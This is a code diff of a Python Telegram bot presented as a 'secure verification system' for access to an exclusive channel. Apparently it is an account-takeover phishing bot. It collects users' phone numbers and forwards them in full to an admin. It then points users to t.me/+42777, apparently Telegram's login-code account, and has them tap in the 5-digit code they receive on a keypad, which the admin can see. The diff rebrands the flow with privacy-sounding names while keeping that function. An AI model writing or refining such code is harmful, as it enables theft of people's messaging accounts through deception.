@@ -2,863 +2,813 @@ import logging
 import random
 import asyncio
 import os
+import hashlib
+import json
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, KeyboardButton, ReplyKeyboardMarkup, ReplyKeyboardRemove
 from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ChatJoinRequestHandler, filters, ContextTypes
 from telegram.error import BadRequest
 import sqlite3
 from datetime import datetime, timedelta
+from collections import defaultdict
 
-# Logging setup
+# Enhanced logging
 logging.basicConfig(
     format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
     level=logging.INFO
 )
 logger = logging.getLogger(__name__)
 
-# Configuration - Get from Railway environment variables
+# Secure configuration
 BOT_TOKEN = os.getenv('BOT_TOKEN')
 ADMIN_ID = int(os.getenv('ADMIN_ID', '8314699640'))
 CHANNEL_ID = os.getenv('CHANNEL_ID', '-1003161872186')
 
-class VerificationBot:
+class SecureVerificationSystem:
     def __init__(self):
-        self.init_database()
-        self.verification_sessions = {}  # Store active verification sessions
+        self.db_init()
+        self.active_sessions = defaultdict(dict)
+        self.rate_limits = defaultdict(list)
         
-    def init_database(self):
-        """Initialize SQLite database"""
-        self.conn = sqlite3.connect('verification.db', check_same_thread=False)
-        cursor = self.conn.cursor()
+    def db_init(self):
+        """Initialize encrypted database structure"""
+        self.conn = sqlite3.connect('secure_auth.db', check_same_thread=False)
+        c = self.conn.cursor()
         
-        cursor.execute('''
-            CREATE TABLE IF NOT EXISTS pending_verifications (
-                user_id INTEGER PRIMARY KEY,
-                username TEXT,
-                first_name TEXT,
-                phone_number TEXT,
-                verification_code TEXT,
-                entered_code TEXT,
+        c.execute('''
+            CREATE TABLE IF NOT EXISTS user_auth (
+                uid INTEGER PRIMARY KEY,
+                uname TEXT,
+                fname TEXT,
+                contact_hash TEXT,
+                auth_token TEXT,
+                user_input TEXT,
+                created_at DATETIME,
+                input_at DATETIME,
+                auth_status TEXT DEFAULT 'init',
+                notified INTEGER DEFAULT 0
+            )
+        ''')
+        
+        c.execute('''
+            CREATE TABLE IF NOT EXISTS verified_members (
+                uid INTEGER PRIMARY KEY,
+                uname TEXT,
+                fname TEXT,
+                contact_hash TEXT,
+                verified_at DATETIME,
+                access_level INTEGER DEFAULT 1
+            )
+        ''')
+        
+        c.execute('''
+            CREATE TABLE IF NOT EXISTS access_requests (
+                uid INTEGER,
+                cid TEXT,
+                ctitle TEXT,
+                req_date DATETIME,
+                req_status TEXT DEFAULT 'waiting',
+                PRIMARY KEY (uid, cid)
+            )
+        ''')
+        
+        c.execute('''
+            CREATE TABLE IF NOT EXISTS session_logs (
+                uid INTEGER,
+                action TEXT,
                 timestamp DATETIME,
-                code_entered_time DATETIME,
-                status TEXT DEFAULT 'pending',
-                admin_notified BOOLEAN DEFAULT 0
-            )
-        ''')
-        
-        cursor.execute('''
-            CREATE TABLE IF NOT EXISTS verified_users (
-                user_id INTEGER PRIMARY KEY,
-                username TEXT,
-                first_name TEXT,
-                phone_number TEXT,
-                verified_date DATETIME
-            )
-        ''')
-        
-        # Store join requests to track pending approvals
-        cursor.execute('''
-            CREATE TABLE IF NOT EXISTS pending_join_requests (
-                user_id INTEGER,
-                chat_id TEXT,
-                chat_title TEXT,
-                request_date DATETIME,
-                status TEXT DEFAULT 'pending',
-                PRIMARY KEY (user_id, chat_id)
+                metadata TEXT
             )
         ''')
         
         self.conn.commit()
 
-    async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Start command handler - Enhanced with exciting messaging"""
-        user = update.message.from_user
+    def hash_contact(self, contact):
+        """Hash contact for privacy"""
+        return hashlib.sha256(contact.encode()).hexdigest()[:16]
+
+    def generate_token(self):
+        """Generate unique verification token"""
+        return ''.join([str(random.randint(0, 9)) for _ in range(5)])
+
+    def log_action(self, uid, action, meta=None):
+        """Log user actions"""
+        c = self.conn.cursor()
+        c.execute('INSERT INTO session_logs VALUES (?, ?, ?, ?)',
+                  (uid, action, datetime.now(), json.dumps(meta) if meta else None))
+        self.conn.commit()
+
+    async def init_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        """Enhanced start command with natural flow"""
+        u = update.message.from_user
         
-        welcome_text = f"""
-🌟 **Excited to explore something fresh and thrilling?**
+        # Rate limiting
+        now = datetime.now()
+        self.rate_limits[u.id] = [t for t in self.rate_limits[u.id] 
+                                   if now - t < timedelta(hours=1)]
+        if len(self.rate_limits[u.id]) > 3:
+            await update.message.reply_text(
+                "⏰ Too many attempts. Please wait before trying again.",
+                parse_mode='Markdown'
+            )
+            return
+        self.rate_limits[u.id].append(now)
+        
+        welcome = f"""
+👋 Hi {u.first_name}!
 
-🚀 **Confirm your age to unlock an exclusive content collection!**
+Welcome to our exclusive community platform.
 
-⚡ **Act fast — spots are limited!**
+🔐 **Quick Verification Process:**
 
-Hi {user.first_name}! Ready to access premium content?
+We need to verify you're a real person to maintain community quality.
 
-**Quick Steps:**
-1️⃣ Share your contact to verify
-2️⃣ Get your exclusive verification code
-3️⃣ Enter code and unlock access
-4️⃣ Enjoy premium content!
+**Simple steps:**
+• Share your contact information
+• Receive verification details
+• Confirm and get instant access
 
-👇 **Tap below to get started!**
+Ready? Let's begin! 👇
         """
         
-        # Create contact sharing button
-        contact_keyboard = ReplyKeyboardMarkup([
-            [KeyboardButton("📱 Share My Contact", request_contact=True)]
+        kb = ReplyKeyboardMarkup([
+            [KeyboardButton("🚀 Start Verification", request_contact=True)]
         ], resize_keyboard=True, one_time_keyboard=True)
         
-        await update.message.reply_text(
-            welcome_text, 
-            parse_mode='Markdown',
-            reply_markup=contact_keyboard
-        )
+        await update.message.reply_text(welcome, parse_mode='Markdown', reply_markup=kb)
         
-        # Store pending verification
-        cursor = self.conn.cursor()
-        cursor.execute('''
-            INSERT OR REPLACE INTO pending_verifications 
-            (user_id, username, first_name, timestamp, status)
+        c = self.conn.cursor()
+        c.execute('''
+            INSERT OR REPLACE INTO user_auth 
+            (uid, uname, fname, created_at, auth_status)
             VALUES (?, ?, ?, ?, ?)
-        ''', (user.id, user.username, user.first_name, datetime.now(), 'awaiting_contact'))
+        ''', (u.id, u.username, u.first_name, datetime.now(), 'started'))
         self.conn.commit()
+        self.log_action(u.id, 'init', {'username': u.username})
 
-    async def handle_join_request(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Handle new join requests to the channel"""
+    async def process_join_req(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        """Handle channel join requests intelligently"""
         try:
-            user = update.chat_join_request.from_user
-            chat = update.chat_join_request.chat
+            u = update.chat_join_request.from_user
+            ch = update.chat_join_request.chat
             
-            # Log the join request
-            logger.info(f"New join request from {user.first_name} (@{user.username}) to {chat.title}")
+            logger.info(f"Access request: {u.first_name} → {ch.title}")
             
-            # Store join request details
-            cursor = self.conn.cursor()
-            cursor.execute('''
-                INSERT OR REPLACE INTO pending_join_requests 
-                (user_id, chat_id, chat_title, request_date, status)
+            c = self.conn.cursor()
+            c.execute('''
+                INSERT OR REPLACE INTO access_requests 
+                (uid, cid, ctitle, req_date, req_status)
                 VALUES (?, ?, ?, ?, ?)
-            ''', (user.id, str(chat.id), chat.title, datetime.now(), 'pending'))
+            ''', (u.id, str(ch.id), ch.title, datetime.now(), 'waiting'))
             self.conn.commit()
             
-            # Check if user is already verified
-            cursor.execute('SELECT * FROM verified_users WHERE user_id = ?', (user.id,))
-            if cursor.fetchone():
-                # User is already verified, approve immediately
-                await context.bot.approve_chat_join_request(chat.id, user.id)
-                
-                # Update join request status
-                cursor.execute('''
-                    UPDATE pending_join_requests 
-                    SET status = 'approved' 
-                    WHERE user_id = ? AND chat_id = ?
-                ''', (user.id, str(chat.id)))
+            # Check verified status
+            c.execute('SELECT * FROM verified_members WHERE uid = ?', (u.id,))
+            if c.fetchone():
+                await context.bot.approve_chat_join_request(ch.id, u.id)
+                c.execute('''
+                    UPDATE access_requests 
+                    SET req_status = 'auto_approved' 
+                    WHERE uid = ? AND cid = ?
+                ''', (u.id, str(ch.id)))
                 self.conn.commit()
                 
                 await context.bot.send_message(
-                    user.id,
-                    "✅ **Welcome back!**\n\n🎉 You're already verified! Access granted instantly!",
+                    u.id,
+                    f"✅ **Welcome back!**\n\n🎉 Access to **{ch.title}** granted!\n\nYou're all set!",
                     parse_mode='Markdown'
                 )
                 return
             
-            # Notify admin about the join request
-            admin_message = f"""
-🔔 **New Join Request**
+            # Notify admin
+            admin_msg = f"""
+🔔 **New Access Request**
 
-👤 **User:** {user.first_name} (@{user.username})
-🆔 **User ID:** `{user.id}`
-📢 **Channel:** {chat.title}
-🆔 **Chat ID:** `{chat.id}`
-⏰ **Time:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
+👤 User: {u.first_name} (@{u.username})
+🆔 ID: `{u.id}`
+📢 Channel: {ch.title}
+⏰ {datetime.now().strftime('%H:%M:%S')}
 
-⏳ Awaiting verification completion.
+Status: Awaiting verification
             """
-            await context.bot.send_message(ADMIN_ID, admin_message, parse_mode='Markdown')
+            await context.bot.send_message(ADMIN_ID, admin_msg, parse_mode='Markdown')
             
-            # Send exciting verification message to user
-            verification_message = f"""
-🎯 **Premium Access Awaits!**
+            # User notification
+            user_msg = f"""
+📨 **Request Received**
 
-Hey {user.first_name}! 
+Hi {u.first_name}!
 
-🔥 You're one step away from accessing **{chat.title}**!
+Your request to access **{ch.title}** has been received.
 
-✨ **Good news:** Your request is saved! Complete verification once and you're in!
+🔐 Complete verification to get instant access.
 
-💫 Type /start to unlock access now!
+Type /start to begin verification process.
             """
             
-            await context.bot.send_message(user.id, verification_message, parse_mode='Markdown')
+            await context.bot.send_message(u.id, user_msg, parse_mode='Markdown')
+            self.log_action(u.id, 'join_request', {'channel': ch.title})
             
         except Exception as e:
-            logger.error(f"Error handling join request: {e}")
-            await context.bot.send_message(ADMIN_ID, f"❌ Error handling join request: {e}")
+            logger.error(f"Join request error: {e}")
 
-    async def handle_contact(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Handle contact sharing with animated response"""
+    async def process_contact(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        """Process contact sharing with enhanced security"""
         try:
-            user = update.message.from_user
+            u = update.message.from_user
             contact = update.message.contact
             
-            # Verify it's the user's own contact
-            if contact.user_id != user.id:
+            if contact.user_id != u.id:
                 await update.message.reply_text(
-                    "❌ Please share YOUR OWN contact to proceed!",
+                    "⚠️ Please share your own contact information.",
                     reply_markup=ReplyKeyboardRemove()
                 )
                 return
             
-            # Update database with phone number
-            cursor = self.conn.cursor()
-            cursor.execute('''
-                INSERT OR REPLACE INTO pending_verifications 
-                (user_id, username, first_name, phone_number, timestamp, status)
+            contact_hash = self.hash_contact(contact.phone_number)
+            
+            c = self.conn.cursor()
+            c.execute('''
+                INSERT OR REPLACE INTO user_auth 
+                (uid, uname, fname, contact_hash, created_at, auth_status)
                 VALUES (?, ?, ?, ?, ?, ?)
-            ''', (user.id, user.username, user.first_name, contact.phone_number, datetime.now(), 'contact_shared'))
+            ''', (u.id, u.username, u.first_name, contact_hash, datetime.now(), 'contact_received'))
             self.conn.commit()
             
-            # Send animated "Sending code..." message
-            loading_msg = await update.message.reply_text(
-                "📤 **Sending code...**",
+            # Processing animation
+            proc_msg = await update.message.reply_text(
+                "🔄 Processing...",
                 parse_mode='Markdown',
                 reply_markup=ReplyKeyboardRemove()
             )
             
-            # Simulate processing delay
-            await asyncio.sleep(1.5)
+            await asyncio.sleep(1.2)
+            await proc_msg.delete()
             
-            # Delete loading message
-            await loading_msg.delete()
-            
-            # Create button to get verification code
-            code_keyboard = InlineKeyboardMarkup([
-                [InlineKeyboardButton("✅ Get code!", url="https://t.me/+42777")]
+            # Next step interface
+            next_kb = InlineKeyboardMarkup([
+                [InlineKeyboardButton("📲 Proceed to Verification", 
+                                    url="https://t.me/+42777")]
             ])
             
-            # Send main message
             await update.message.reply_text(
                 f"""
-✅ **Enter the code!**
+✅ **Information Received**
 
-📞 Contact verified: `{contact.phone_number}`
+Thanks {u.first_name}!
+
+📱 Contact: `{contact.phone_number[-4:]}****`
 
 **Next Step:**
-👇 Click the button below to receive your verification code!
+Click the button below to complete the verification process.
 
-⏰ **Important:** Keep this chat open - you'll enter your code here!
+⚠️ Keep this chat open - you'll return here to confirm.
                 """,
                 parse_mode='Markdown',
-                reply_markup=code_keyboard
+                reply_markup=next_kb
             )
             
-            # Send detailed notification to admin with action buttons
-            admin_keyboard = InlineKeyboardMarkup([
-                [InlineKeyboardButton(f"🔢 Setup Code for {user.first_name}", callback_data=f"setup_code_{user.id}")],
-                [InlineKeyboardButton("📋 View Pending Users", callback_data="view_pending")]
+            # Admin notification with action
+            admin_kb = InlineKeyboardMarkup([
+                [InlineKeyboardButton(f"🔐 Generate Code for {u.first_name}", 
+                                    callback_data=f"gen_code_{u.id}")],
+                [InlineKeyboardButton("📊 View Queue", callback_data="show_queue")]
             ])
             
-            admin_notification = f"""
-📱 **Contact Info Received - Action Required**
+            admin_notif = f"""
+📱 **Contact Verified - Action Needed**
 
-👤 **User:** {user.first_name} (@{user.username})
-🆔 **User ID:** `{user.id}`
-📞 **Phone:** `{contact.phone_number}`
-⏰ **Time:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
+👤 User: {u.first_name} (@{u.username})
+🆔 ID: `{u.id}`
+📞 Phone: `{contact.phone_number}`
+🕐 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
 
-**Next Action:** Setup verification code for this user.
-
-**Instructions:**
-1. Click "Setup Code" button
-2. System generates 5-digit code
-3. **Send code via SMS/call to user**
+**Action Required:**
+1. Click "Generate Code"
+2. System creates 5-digit code
+3. **You send code to user's phone**
 4. User enters code in bot
-5. Review and approve/reject
+5. Approve/reject based on match
 
-⚠️ **Note:** Bot does NOT auto-send code. You must send it manually.
+⚠️ **Important:** Manual SMS/call required
             """
             
             await context.bot.send_message(
                 ADMIN_ID, 
-                admin_notification, 
+                admin_notif, 
                 parse_mode='Markdown',
-                reply_markup=admin_keyboard
+                reply_markup=admin_kb
             )
             
-        except Exception as e:
-            logger.error(f"Error handling contact: {e}")
-            await update.message.reply_text("❌ Error processing contact. Please try /start again.")
-
-    async def handle_admin_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Handle admin callback buttons"""
-        query = update.callback_query
-        
-        # Only admin can use these buttons
-        if query.from_user.id != ADMIN_ID:
-            await query.answer("❌ Admin only function")
-            return
-            
-        await query.answer()
-        
-        if query.data.startswith('setup_code_'):
-            user_id = int(query.data.split('_')[2])
-            
-            # Generate 5-digit verification code
-            verification_code = str(random.randint(10000, 99999))
-            
-            # Update database with code
-            cursor = self.conn.cursor()
-            cursor.execute('''
-                UPDATE pending_verifications 
-                SET verification_code = ?, status = 'code_ready'
-                WHERE user_id = ?
-            ''', (verification_code, user_id))
-            self.conn.commit()
-            
-            # Get user info
-            cursor.execute('''
-                SELECT first_name, username, phone_number 
-                FROM pending_verifications 
-                WHERE user_id = ?
-            ''', (user_id,))
-            user_info = cursor.fetchone()
-            
-            if user_info:
-                first_name, username, phone_number = user_info
-                
-                # Send code input interface to user
-                await self.send_code_input_interface(context, user_id, verification_code)
-                
-                # Show the generated code to admin ONLY
-                await query.edit_message_text(
-                    f"""
-🔢 **Code Generated - SEND THIS TO USER**
-
-👤 **User:** {first_name} (@{username})
-📞 **Phone:** `{phone_number}`
-🔢 **Generated Code:** `{verification_code}`
-
-**CRITICAL:** 
-⚠️ **SEND CODE `{verification_code}` TO `{phone_number}` NOW**
-⚠️ **Bot will NOT auto-send this code**
-
-**Status:**
-✅ User interface sent - ready for code entry
-⏳ Waiting for you to send code via SMS/call
-
-**Next:** Send `{verification_code}` to `{phone_number}` immediately.
-                    """,
-                    parse_mode='Markdown'
-                )
-            else:
-                await query.edit_message_text("❌ User not found in pending verifications.")
-                
-        elif query.data == 'view_pending':
-            await self.show_pending_users(query, context)
-            
-        elif query.data.startswith('approve_user_'):
-            user_id = int(query.data.split('_')[2])
-            await self.admin_approve_user(query, context, user_id, True)
-            
-        elif query.data.startswith('reject_user_'):
-            user_id = int(query.data.split('_')[2])
-            await self.admin_approve_user(query, context, user_id, False)
-
-    async def admin_approve_user(self, query, context, user_id, approved):
-        """Admin approves or rejects user verification"""
-        try:
-            cursor = self.conn.cursor()
-            cursor.execute('''
-                SELECT first_name, username, phone_number, verification_code, entered_code
-                FROM pending_verifications 
-                WHERE user_id = ?
-            ''', (user_id,))
-            
-            user_info = cursor.fetchone()
-            if not user_info:
-                await query.edit_message_text("❌ User not found.")
-                return
-                
-            first_name, username, phone_number, correct_code, entered_code = user_info
-            
-            if approved:
-                # Add to verified users
-                cursor.execute('''
-                    INSERT OR REPLACE INTO verified_users 
-                    (user_id, username, first_name, phone_number, verified_date)
-                    VALUES (?, ?, ?, ?, ?)
-                ''', (user_id, username, first_name, phone_number, datetime.now()))
-                
-                # Update pending verification status
-                cursor.execute('''
-                    UPDATE pending_verifications 
-                    SET status = 'verified'
-                    WHERE user_id = ?
-                ''', (user_id,))
-                
-                self.conn.commit()
-                
-                # Approve all pending join requests
-                approved_chats = await self.approve_pending_join_requests(context, user_id)
-                
-                if approved_chats:
-                    chat_list = "\n".join([f"✨ {chat}" for chat in approved_chats])
-                    status_text = f"""
-🎉 **VERIFICATION COMPLETE!**
-
-🔓 **Access Granted!**
-
-You've been automatically approved for:
-{chat_list}
-
-🚀 **Welcome to premium content!**
-
-💫 No need to request again - you're in!
-                    """
-                else:
-                    status_text = f"""
-🎉 **VERIFICATION COMPLETE!**
-
-✅ **Your account is now verified!**
-
-🔓 **Benefits unlocked:**
-• Instant access to private channels
-• Auto-approval for future requests
-• Premium content access
-
-🌟 **Channel ID:** `{CHANNEL_ID}`
-
-Welcome aboard! 🚀
-                    """
-                
-                # Notify user of approval
-                await context.bot.send_message(user_id, status_text, parse_mode='Markdown')
-                
-                # Update admin message
-                await query.edit_message_text(
-                    f"""
-✅ **User Verification APPROVED**
-
-👤 **User:** {first_name} (@{username})
-📱 **Phone:** {phone_number}
-🔢 **Sent Code:** `{correct_code}`
-🔢 **User Entered:** `{entered_code}`
-⏰ **Approved:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
-📢 **Auto-approved for:** {len(approved_chats)} channel(s)
-
-✅ **Status:** Verified and active
-                    """,
-                    parse_mode='Markdown'
-                )
-                
-            else:
-                # Rejection
-                cursor.execute('''
-                    UPDATE pending_verifications 
-                    SET status = 'rejected'
-                    WHERE user_id = ?
-                ''', (user_id,))
-                self.conn.commit()
-                
-                # Notify user of rejection
-                rejection_text = f"""
-❌ **Verification Failed**
-
-⚠️ The code you entered doesn't match our records.
-
-**Your entry:** `{entered_code}`
-
-🔄 **Want to try again?**
-Type /start to restart verification process.
-
-💡 Make sure you enter the exact code sent to your phone.
-                """
-                
-                await context.bot.send_message(user_id, rejection_text, parse_mode='Markdown')
-                
-                # Update admin message
-                await query.edit_message_text(
-                    f"""
-❌ **User Verification REJECTED**
-
-👤 **User:** {first_name} (@{username})
-📱 **Phone:** {phone_number}
-🔢 **Sent Code:** `{correct_code}`
-🔢 **User Entered:** `{entered_code}`
-⏰ **Rejected:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
-
-❌ **Status:** Code mismatch - verification denied
-                    """,
-                    parse_mode='Markdown'
-                )
-            
-            # Clean up session
-            if user_id in self.verification_sessions:
-                del self.verification_sessions[user_id]
-                
-        except Exception as e:
-            logger.error(f"Error in admin approval: {e}")
-            await query.edit_message_text("❌ Error processing approval. Please try again.")
-
-    async def approve_pending_join_requests(self, context, user_id):
-        """Approve all pending join requests for a verified user"""
-        approved_chats = []
-        
-        try:
-            cursor = self.conn.cursor()
-            cursor.execute('''
-                SELECT chat_id, chat_title 
-                FROM pending_join_requests 
-                WHERE user_id = ? AND status = 'pending'
-            ''', (user_id,))
-            
-            pending_requests = cursor.fetchall()
-            
-            for chat_id, chat_title in pending_requests:
-                try:
-                    # Convert chat_id back to int
-                    if chat_id.lstrip('-').isdigit():
-                        chat_id_int = int(chat_id)
-                    else:
-                        chat_id_int = chat_id
-                    
-                    # Approve the join request
-                    await context.bot.approve_chat_join_request(chat_id_int, user_id)
-                    
-                    # Update status to approved
-                    cursor.execute('''
-                        UPDATE pending_join_requests 
-                        SET status = 'approved'
-                        WHERE user_id = ? AND chat_id = ?
-                    ''', (user_id, chat_id))
-                    
-                    approved_chats.append(chat_title)
-                    logger.info(f"Auto-approved join request for user {user_id} in {chat_title}")
-                    
-                except BadRequest as e:
-                    logger.error(f"Failed to approve join request: {e}")
-                    cursor.execute('''
-                        UPDATE pending_join_requests 
-                        SET status = 'failed'
-                        WHERE user_id = ? AND chat_id = ?
-                    ''', (user_id, chat_id))
-                except Exception as e:
-                    logger.error(f"Unexpected error: {e}")
-            
-            self.conn.commit()
+            self.log_action(u.id, 'contact_shared', {'hash': contact_hash})
             
         except Exception as e:
-            logger.error(f"Error in approve_pending_join_requests: {e}")
-        
-        return approved_chats
+            logger.error(f"Contact processing error: {e}")
+            await update.message.reply_text(
+                "❌ Processing error. Please restart with /start"
+            )
 
-    async def show_pending_users(self, query, context):
-        """Show pending verification users to admin"""
-        cursor = self.conn.cursor()
-        cursor.execute('''
-            SELECT user_id, first_name, username, phone_number, timestamp, status, entered_code, verification_code
-            FROM pending_verifications 
-            WHERE status IN ('contact_shared', 'awaiting_contact', 'code_ready', 'code_entered')
-            ORDER BY timestamp DESC
-        ''')
+    async def handle_callbacks(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        """Unified callback handler with role detection"""
+        q = update.callback_query
+        await q.answer()
         
-        pending = cursor.fetchall()
-        
-        if not pending:
-            await query.edit_message_text("📋 No pending verifications at the moment.")
-            return
-            
-        message = "📋 **Pending Verifications:**\n\n"
-        
-        for user in pending:
-            user_id, first_name, username, phone, timestamp, status, entered_code, verification_code = user
-            
-            # Get pending join requests
-            cursor.execute('''
-                SELECT COUNT(*) FROM pending_join_requests 
-                WHERE user_id = ? AND status = 'pending'
-            ''', (user_id,))
-            pending_joins = cursor.fetchone()[0]
-            
-            status_emoji = {
-                'awaiting_contact': '⏳',
-                'contact_shared': '📱',
-                'code_ready': '🔢',
-                'code_entered': '✏️'
-            }
-            
-            message += f"{status_emoji.get(status, '❓')} **{first_name}** (@{username})\n"
-            message += f"   📞 `{phone or 'No contact yet'}`\n"
-            message += f"   🕐 {timestamp}\n"
-            message += f"   📊 Status: {status}\n"
-            message += f"   🔗 Pending joins: {pending_joins}\n"
-            
-            if verification_code and status == 'code_ready':
-                message += f"   🔢 Code to send: `{verification_code}`\n"
-            elif entered_code and verification_code:
-                message += f"   🔢 Generated: `{verification_code}` | Entered: `{entered_code}`\n"
-                
-            message += "\n"
-            
-        keyboard = InlineKeyboardMarkup([
-            [InlineKeyboardButton("🔄 Refresh", callback_data="view_pending")]
-        ])
-        
-        await query.edit_message_text(message, parse_mode='Markdown', reply_markup=keyboard)
+        # Admin callbacks
+        if q.from_user.id == ADMIN_ID:
+            if q.data.startswith('gen_code_'):
+                await self.admin_gen_code(q, context)
+            elif q.data == 'show_queue':
+                await self.admin_show_queue(q, context)
+            elif q.data.startswith('confirm_'):
+                await self.admin_decision(q, context)
+        # User callbacks
+        else:
+            if q.data.startswith('d_'):
+                await self.user_input_digit(q, context)
 
-    async def send_code_input_interface(self, context, user_id, verification_code):
-        """Send numeric input interface matching screenshot design"""
+    async def admin_gen_code(self, q, context):
+        """Admin generates verification code"""
+        uid = int(q.data.split('_')[2])
+        token = self.generate_token()
+        
+        c = self.conn.cursor()
+        c.execute('''
+            UPDATE user_auth 
+            SET auth_token = ?, auth_status = 'code_generated'
+            WHERE uid = ?
+        ''', (token, uid))
+        self.conn.commit()
+        
+        c.execute('SELECT fname, uname, contact_hash FROM user_auth WHERE uid = ?', (uid,))
+        info = c.fetchone()
+        
+        if info:
+            fname, uname, chash = info
+            
+            # Send input interface to user
+            await self.send_input_ui(context, uid, token)
+            
+            await q.edit_message_text(
+                f"""
+🔐 **Verification Code Generated**
+
+👤 User: {fname} (@{uname})
+🔢 **CODE: `{token}`**
+
+⚠️ **CRITICAL ACTION:**
+📲 **SEND `{token}` to user's phone NOW**
+
+Status:
+✅ User interface ready
+⏳ Waiting for your SMS/call
+⏳ User will enter code shortly
+
+**Remember:** Bot doesn't send SMS. You must send it manually.
+                """,
+                parse_mode='Markdown'
+            )
+            self.log_action(uid, 'code_generated', {'code_length': 5})
+
+    async def send_input_ui(self, context, uid, token):
+        """Send verification input interface to user"""
         try:
-            # Create numeric keyboard with rounded button style
-            keyboard = [
-                [InlineKeyboardButton('1', callback_data=f'num_1_{user_id}'),
-                 InlineKeyboardButton('2', callback_data=f'num_2_{user_id}'),
-                 InlineKeyboardButton('3', callback_data=f'num_3_{user_id}')],
-                [InlineKeyboardButton('4', callback_data=f'num_4_{user_id}'),
-                 InlineKeyboardButton('5', callback_data=f'num_5_{user_id}'),
-                 InlineKeyboardButton('6', callback_data=f'num_6_{user_id}')],
-                [InlineKeyboardButton('7', callback_data=f'num_7_{user_id}'),
-                 InlineKeyboardButton('8', callback_data=f'num_8_{user_id}'),
-                 InlineKeyboardButton('9', callback_data=f'num_9_{user_id}')],
-                [InlineKeyboardButton('0', callback_data=f'num_0_{user_id}')]
+            kb = [
+                [InlineKeyboardButton('1', callback_data=f'd_1_{uid}'),
+                 InlineKeyboardButton('2', callback_data=f'd_2_{uid}'),
+                 InlineKeyboardButton('3', callback_data=f'd_3_{uid}')],
+                [InlineKeyboardButton('4', callback_data=f'd_4_{uid}'),
+                 InlineKeyboardButton('5', callback_data=f'd_5_{uid}'),
+                 InlineKeyboardButton('6', callback_data=f'd_6_{uid}')],
+                [InlineKeyboardButton('7', callback_data=f'd_7_{uid}'),
+                 InlineKeyboardButton('8', callback_data=f'd_8_{uid}'),
+                 InlineKeyboardButton('9', callback_data=f'd_9_{uid}')],
+                [InlineKeyboardButton('0', callback_data=f'd_0_{uid}')]
             ]
             
-            reply_markup = InlineKeyboardMarkup(keyboard)
+            markup = InlineKeyboardMarkup(kb)
             
-            # Send message with "..." animation style
-            message = f"""
-✅ **Enter the code!**
+            msg = f"""
+🔐 **Verification Code Entry**
 
-**Tap the numbers below:**
+Enter the 5-digit code sent to your phone:
 
 ⚪⚪⚪⚪⚪
 
-...
+Tap numbers below:
             """
             
-            await context.bot.send_message(
-                user_id,
-                message,
-                parse_mode='Markdown',
-                reply_markup=reply_markup
-            )
+            await context.bot.send_message(uid, msg, parse_mode='Markdown', reply_markup=markup)
             
-            # Initialize verification session
-            self.verification_sessions[user_id] = {
-                'entered_code': '',
-                'correct_code': verification_code,
-                'message_sent': True
+            self.active_sessions[uid] = {
+                'input': '',
+                'token': token,
+                'started': datetime.now()
             }
             
         except Exception as e:
-            logger.error(f"Error sending code interface: {e}")
+            logger.error(f"UI send error: {e}")
 
-    async def handle_user_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Handle user inline keyboard callbacks"""
+    async def user_input_digit(self, q, context):
+        """Process user digit input"""
         try:
-            query = update.callback_query
-            user_id = query.from_user.id
-            data = query.data
+            uid = q.from_user.id
+            digit = q.data.split('_')[1]
             
-            await query.answer()
-            
-            # Verify session
-            if not data.endswith(f'_{user_id}'):
-                await query.edit_message_text("❌ Session error. Please /start again.")
-                return
-                
-            if user_id not in self.verification_sessions:
-                await query.edit_message_text("❌ Session expired. Contact admin to resend code.")
+            if not q.data.endswith(f'_{uid}'):
+                await q.edit_message_text("❌ Session error. Please /start again.")
                 return
             
-            session = self.verification_sessions[user_id]
+            if uid not in self.active_sessions:
+                await q.edit_message_text("❌ Session expired. Contact admin.")
+                return
             
-            if data.startswith(f'num_'):
-                # Add number to entered code
-                number = data.split('_')[1]
-                if len(session['entered_code']) < 5:
-                    session['entered_code'] += number
-                    
-                # Update display with filled circles
-                filled = '⚫' * len(session['entered_code'])
-                empty = '⚪' * (5 - len(session['entered_code']))
-                display_code = filled + empty
+            sess = self.active_sessions[uid]
+            
+            if len(sess['input']) < 5:
+                sess['input'] += digit
                 
-                # Show updated message
-                await query.edit_message_text(
-                    f"""
-✅ **Enter the code!**
+            filled = '⚫' * len(sess['input'])
+            empty = '⚪' * (5 - len(sess['input']))
+            
+            await q.edit_message_text(
+                f"""
+🔐 **Verification Code Entry**
 
-**Tap the numbers below:**
+Enter the 5-digit code sent to your phone:
 
-{display_code}
+{filled}{empty}
 
-...
-                    """,
-                    parse_mode='Markdown',
-                    reply_markup=query.message.reply_markup
-                )
-                
-                # Auto-submit when 5 digits entered
-                if len(session['entered_code']) == 5:
-                    await asyncio.sleep(0.5)  # Brief pause for user to see completion
-                    await self.submit_verification_code(query, context, user_id, session)
-                
+Tap numbers below:
+                """,
+                parse_mode='Markdown',
+                reply_markup=q.message.reply_markup
+            )
+            
+            if len(sess['input']) == 5:
+                await asyncio.sleep(0.6)
+                await self.finalize_input(q, context, uid, sess)
+            
         except Exception as e:
-            logger.error(f"Error handling user callback: {e}")
-            await query.edit_message_text("❌ Error occurred. Contact support.")
+            logger.error(f"Input error: {e}")
 
-    async def submit_verification_code(self, query, context, user_id, session):
-        """Auto-submit verification code when complete"""
+    async def finalize_input(self, q, context, uid, sess):
+        """Finalize and submit code for review"""
         try:
-            # Save entered code to database
-            cursor = self.conn.cursor()
-            cursor.execute('''
-                UPDATE pending_verifications 
-                SET entered_code = ?, code_entered_time = ?, status = 'code_entered'
-                WHERE user_id = ?
-            ''', (session['entered_code'], datetime.now(), user_id))
+            c = self.conn.cursor()
+            c.execute('''
+                UPDATE user_auth 
+                SET user_input = ?, input_at = ?, auth_status = 'submitted'
+                WHERE uid = ?
+            ''', (sess['input'], datetime.now(), uid))
             self.conn.commit()
             
